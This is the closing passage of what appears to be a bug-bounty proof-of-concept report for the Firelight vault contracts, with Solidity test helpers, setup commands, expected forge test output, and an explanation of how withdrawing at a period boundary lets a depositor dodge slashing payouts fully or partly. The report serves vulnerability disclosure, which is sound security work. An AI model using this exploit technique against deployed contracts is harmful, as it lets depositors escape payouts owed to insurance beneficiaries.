    function singleTree(bytes32 leaf) internal pure returns (bytes32 root, bytes32[] memory proof) {
        root = leaf;
        proof = new bytes32[](0);
    }

    /// Two-leaf tree (OZ standard merkle tree): sorted-pair root.
    function doubleTree(bytes32 leafA, bytes32 leafB)
        internal
        pure
        returns (bytes32 root, bytes32[] memory proofForA, bytes32[] memory proofForB)
    {
        root = hashPair(leafA, leafB);
        proofForA = new bytes32[](1);
        proofForA[0] = leafB;
        proofForB = new bytes32[](1);
        proofForB[0] = leafA;
    }

    function hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(bytes.concat(a, b)) : keccak256(bytes.concat(b, a));
    }

    /// ceil(cover * rateBps * duration / (BPS * 365 days)) — mirrors _calculatePremium
    function prorate(uint256 cover, uint32 rateBps, uint256 duration) internal pure returns (uint256) {
        uint256 num = cover * uint256(rateBps) * duration;
        uint256 den = BPS * SECONDS_PER_YEAR;
        return (num + den - 1) / den;
    }

    /// ceil-scale canonical 18d amount to 6d native
    function scale18to6Ceil(uint256 v) internal pure returns (uint256) {
        uint256 d = 10 ** 12;
        return (v + d - 1) / d;
    }

    function pc(uint48 epoch, uint48 duration, uint256 startingPeriod)
        private
        pure
        returns (IFirelightVault.PeriodConfiguration memory)
    {
        return IFirelightVault.PeriodConfiguration({epoch: epoch, duration: duration, startingPeriod: startingPeriod});
    }
}
```

### 4. How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout v1_audit_ready            # 42f9ea5

# solidity dependencies (the hardhat dev-deps are not needed)
npm i --ignore-scripts @openzeppelin/contracts@5.2.0
npx patch-package                      # applies patches/@openzeppelin+contracts+5.2.0.patch
npm i --ignore-scripts @openzeppelin/contracts-upgradeable@5.4.0
git clone --depth 1 -b v1.9.4 https://github.com/foundry-rs/forge-std lib/forge-std

# add the four files from sections 1-3 at the paths shown above

forge test --match-path "test/foundry/F01*" -vv
```

### 5. Expected output

```
Ran 2 tests for test/foundry/F01_BoundaryWithdrawSlashEvasion.t.sol:F01_BoundaryWithdrawSlashEvasionTest
[PASS] test_boundaryWithdrawEvadesSlashing() (gas: 7283272)
[PASS] test_boundaryWithdrawUnderpaysPartialWithdraw() (gas: 7558918)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

### 6. What each test proves

**`test_boundaryWithdrawEvadesSlashing` — total evasion.** A single depositor holds 100% of a 6-decimal vault (10,000 units) and calls `withdraw` at `boundary = vault.currentPeriodEnd()`. The period-start snapshot is rewritten to `0` (`assertEq(vault.totalAssetsAt(boundary), 0)`) while the assets sit in `withdrawAssets[2]`, which `payout` still counts as payable. An honest `PAYOUT_ROLE` payout for a 10,000-unit incident captured at `boundary` emits `PayoutExecuted(receiver, 10_000e6, 0, boundary)` — the beneficiary receives **0** while the vault still physically holds the funds. After the payout window closes, `claimWithdraw(2)` returns 100% of the deposit to the attacker.

**`test_boundaryWithdrawUnderpaysPartialWithdraw` — partial evasion.** Attacker and an honest staker deposit 100 units each. The attacker withdraws their 100 at the boundary, cutting the cap from 200 to 100 (`assertEq(vault.totalAssetsAt(boundary), amount)`). A legitimate 200-unit payout then settles at **100** instead of 200. The shortfall is unrecoverable: `_isPeriodInPayoutWindow` only allows `payout` during the capture period or the next one.
